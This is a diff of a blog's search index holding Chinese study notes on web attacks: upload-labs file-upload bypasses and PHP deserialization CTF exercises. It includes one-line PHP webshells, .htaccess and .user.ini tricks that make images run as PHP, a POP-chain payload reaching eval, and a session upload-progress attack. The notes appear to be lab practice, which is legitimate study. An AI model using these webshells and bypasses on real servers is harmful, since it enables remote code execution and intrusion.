@@ -19,6 +19,89 @@ More info: Deployment
 ]]></content>
   </entry>
   <entry>
+    <title></title>
+    <url>/blog/2026/05/19/upload-labs/</url>
+    <content><![CDATA[pass-01function checkFile() &#123;    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;    if (file == null || file == &quot;&quot;) &#123;        alert(&quot;请选择要上传的文件!&quot;);        return false;    &#125;    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    &#125;&#125;
+
+本关只进行了javascript的过滤，可以在浏览器中关闭javascript选项，即可上传成功。
+#webshell.php&lt;?php eval($_GET[&#x27;webshell&#x27;]);?&gt;#webshell1.php&lt;?php $_GET[&#x27;function&#x27;]($_GET[&#x27;key&#x27;]);?&gt;
+
+上传webshell.php文件即可
+pass-02$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+本关只对文件类型做了过滤，因此使用burpsuit工具来更改数据包即可通过
+pass-03$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+本关对上传的文件后缀有过滤，但是这个过滤并不完整，可以将文件的后缀改成php5等数字来绕过
+pass-04$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+.htaccess文件解析漏洞：Apache 服务器的配置文件上传与解析绕过漏洞，核心是攻击者上传恶意 .htaccess 篡改目录解析规则，将普通文件（如图片）当作 PHP 执行，最终 getshell
+#创建.htaccess文件，写入：AddType application/x-httpd-php .jpg	# 使 .jpg 当作 PHP 执行
+
+先将webshell.php文件改成.jpg文件，上传进去，然后再将.htaccess文件上传
+
+pass-05$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+这关将.htaccess文件给过滤了，但是放出了个.ini文件，因此利用这个漏洞来创建.user.ini文件
+ .user.ini 解析漏洞：在执行当前目录下所有 PHP 文件之前，自动包含并执行指定的文件。
+条件：
+
+服务器是 PHP + Nginx&#x2F;Apache
+PHP &gt;&#x3D; 5.3.0（支持 .user.ini）
+上传目录允许 PHP 解析（有 php 文件）
+上传未拦截 .user.ini
+服务器未禁用 .user.ini 读取
+
+#创建.user.ini文件，并上传auto_prepend_file=1.jpg		#这句话意思是执行当前目录下所有php文件之前，自动包含并执行1.jpg文件
+
+pass-06$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+看完源码发现，本关并未将文件名的后缀转成小写，而过滤名单中，只存在小写的后缀，因此只需要将后缀改成大写，即可绕过。
+
+pass-07本关的源代码中有严重漏洞，他只检查最后一个点后面的后缀名，如果构造后缀名时使用webshell.php.jpg则只会认为后缀时jpg，过滤名单直接无效
+
+]]></content>
+  </entry>
+  <entry>
+    <title>操作案例</title>
+    <url>/blog/2026/05/14/project/</url>
+    <content><![CDATA[php反序列化初步体验#3.php&lt;?php$txt = $_GET[&quot;txt&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($txt) &amp;&amp; (file_get_contents($txt, &#x27;r&#x27;) === &quot;welcome to the bugkuctf&quot;))&#123;    echo &quot;hello friend!&lt;br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;, $file))    &#123;        echo &quot;不能现在就给你flag哦&quot;;        exit();    &#125;    else    &#123;        // 文件包含 包含的数据 用户可控        include($file);        // $password 就要是一个对象了 $password 就要用户传递一个序列化的值        $password = unserialize($password);        // 触发__tostring        echo $password;    &#125;&#125;else&#123;    echo &quot;you are not the number of bugku ! &quot;;&#125;?&gt;
+
+#hint.php&lt;?phpclass Flag&#123;//flag.php    public $file;    // 这里有点问题 第一__tostring  file_get_contents 我们的目标是读文件 $file    public function __tostring()&#123;        if(isset($this-&gt;file))&#123;            echo file_get_contents($this-&gt;file);            echo &quot;&lt;br&gt;&quot;;            return (&quot;good&quot;);        &#125;    &#125;&#125;?&gt;
+
+#flag.txtFlag&#123;165151daw1d51ad951&#125;
+
+
+POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;
+
+
+
+#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
+
+
+session序列化漏洞//8.php&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123;    public $mdzz;    function __construct()    &#123;        $this-&gt;mdzz = &#x27;phpinfo();&#x27;;    &#125;        function __destruct()    &#123;        eval($this-&gt;mdzz);		//看到触发点在这里    &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123;    $m = new OowoO();&#125;else&#123;    highlight_string(file_get_contents(&#x27;8.php&#x27;));&#125;?&gt;
+
+
+构造payload
+ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);		//session.upload_progress（上传进度写入 Session）永远使用 php.ini 的全局配置，所以这行可有可无(压根不起作用)，需要手动去设置session_start();class OowoO&#123;    public $mdzz = &#x27;print_r(scandir(dirname(__FILE__)));&#x27;;&#125;$obj = new OowoO();echo serialize($obj);
+
+创建一个本地的html上传页面来给8.php上传文件
+&lt;form action=&quot;8.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;
+
+如果session.upload_progress.cleanup被开启，则可以使用竞争的方式去让他失效，如一下：
+给他添加一个变量，然后一直跑这个变量，让他奔溃。
+
+
+总结：
+#如果session.upload_progress.cleanup开启可以使用竞争来让他奔溃#如果session.serialize_handler使用相同的序列化处理器，则无法进行]]></content>
+      <categories>
+        <category>操作</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安学习</title>
     <url>/blog/2026/05/14/new/</url>
     <content><![CDATA[前提学习docker相关知识点容器与镜像的差别：
@@ -175,6 +258,42 @@ __invoke()
 
 反序列化目的：就是RCE执行命令
 反序列化的过程就是变量替换的过程
+实例：
+&lt;?phpclass MyFile &#123;    public $name;    public $user;    public function __construct($name, $user) &#123;        $this-&gt;name = $name;        $this-&gt;user = $user;     &#125;    public function __toString()&#123;        return file_get_contents($this-&gt;name);    &#125;    public function __wakeup()&#123;        if(stristr($this-&gt;name, &quot;flag&quot;)!==False)             $this-&gt;name = &quot;/etc/hostname&quot;;        else            $this-&gt;name = &quot;/etc/passwd&quot;;         if(isset($_GET[&#x27;user&#x27;])) &#123;            $this-&gt;user = $_GET[&#x27;user&#x27;];         &#125;    &#125;    public function __destruct() &#123;        echo $this;     &#125;&#125;if(isset($_GET[&#x27;input&#x27;]))&#123;    $input = $_GET[&#x27;input&#x27;];     if(stristr($input, &#x27;user&#x27;)!==False)&#123;        die(&#x27;Hacker&#x27;);     &#125; else &#123;        unserialize($input);    &#125;&#125;else &#123;     highlight_file(__FILE__);&#125;
+
+session存储机制：
+
+
+
+Directive
+含义
+
+
+
+session.save_handler
+设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)。默认为files
+
+
+session.save_path
+设置session的存储路径，默认在&#x2F;tmp
+
+
+session.serialize_handler
+定义用来序列化&#x2F;反序列化的处理器名字。默认使用php。
+
+
+session.auto_start
+指定会话模块是否在请求开始时启动一个会话，默认为0不启动
+
+
+session.upload_progress.enabed
+将上传文件的进度信息存储在session中。默认开启  当你在很多网站 传文件的时候 会有个进度条 这个进度条 会实时显示你的上传进度  session.upload_progress
+
+
+session.upload_progress.cleanup
+一旦读取了所有的POST数据，立即清除进度信息。默认开启
+
+
 ]]></content>
       <categories>
         <category>渗透知识点</category>
@@ -182,31 +301,6 @@ __invoke()
       <tags>
         <tag>Web安全</tag>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>操作案例</title>
-    <url>/blog/2026/05/14/project/</url>
-    <content><![CDATA[php反序列化初步体验#3.php&lt;?php$txt = $_GET[&quot;txt&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($txt) &amp;&amp; (file_get_contents($txt, &#x27;r&#x27;) === &quot;welcome to the bugkuctf&quot;))&#123;    echo &quot;hello friend!&lt;br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;, $file))    &#123;        echo &quot;不能现在就给你flag哦&quot;;        exit();    &#125;    else    &#123;        // 文件包含 包含的数据 用户可控        include($file);        // $password 就要是一个对象了 $password 就要用户传递一个序列化的值        $password = unserialize($password);        // 触发__tostring        echo $password;    &#125;&#125;else&#123;    echo &quot;you are not the number of bugku ! &quot;;&#125;?&gt;
-
-#hint.php&lt;?phpclass Flag&#123;//flag.php    public $file;    // 这里有点问题 第一__tostring  file_get_contents 我们的目标是读文件 $file    public function __tostring()&#123;        if(isset($this-&gt;file))&#123;            echo file_get_contents($this-&gt;file);            echo &quot;&lt;br&gt;&quot;;            return (&quot;good&quot;);        &#125;    &#125;&#125;?&gt;
-
-#flag.txtFlag&#123;165151daw1d51ad951&#125;
-
-
-POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;
-
-
-
-#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
-
-
-]]></content>
-      <categories>
-        <category>操作</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
       </tags>
   </entry>
 </search>
